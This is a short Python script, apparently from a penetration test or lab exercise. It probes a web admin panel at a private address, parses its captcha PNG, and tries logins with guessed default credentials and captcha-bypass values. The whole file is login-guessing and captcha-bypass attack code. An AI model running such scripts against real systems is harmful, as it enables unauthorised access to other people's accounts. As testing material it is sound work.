import requests
import struct

TARGET = "http://10.0.0.1"
ADMIN = f"{TARGET}/admin/index"

s = requests.Session()
resp = s.get(f"{ADMIN}?action=captcha.js", timeout=10)
print(f"Captcha length: {len(resp.content)} bytes")

data = resp.content
if data[:4] == b'\x89PNG':
    print("Valid PNG header")
    pos = 8
    while pos < len(data):
        length = struct.unpack(">I", data[pos:pos+4])[0]
        chunk_type = data[pos+4:pos+8]
        print(f"  Chunk: {chunk_type}, len={length}")
        pos += 12 + length
        if chunk_type == b'IEND':
            break
else:
    print(f"Not PNG: {data[:20].hex()}")

# Try logins
def try_login(user, pw, cap, s=None):
    if not s:
        s = requests.Session()
    s.get(f"{ADMIN}?action=captcha.js")
    resp = s.post(f"{ADMIN}?execute=1&exec=login", 
                 data={"username": user, "password": pw, "captcha": cap},
                 timeout=10)
    return resp.text

attempts = [
    ("admin", "123456789", ""),
    ("admin", "123456789", "0"),
    ("admin", "123456789", "test"),
]

for u, p, c in attempts:
    try:
        result = try_login(u, p, c)
        print(f"  {u}/{p}/{c}: [{len(result)}b] {result[:100]}")
        if "success" in result.lower():
            print("  *** SUCCESS ***")
    except Exception as e:
        print(f"  error: {e}")

# Try with exact captcha value - what if captcha is always the same?
# What if captcha is stored in the session and we send the right session?
print("\n=== Captcha analysis ===")
# Get captcha, then try to decode it
s2 = requests.Session()
resp2 = s2.get(f"{ADMIN}?action=captcha.js")
print(f"Captcha PNG size: {len(resp2.content)} bytes")
print(f"Session cookie: {dict(s2.cookies)}")
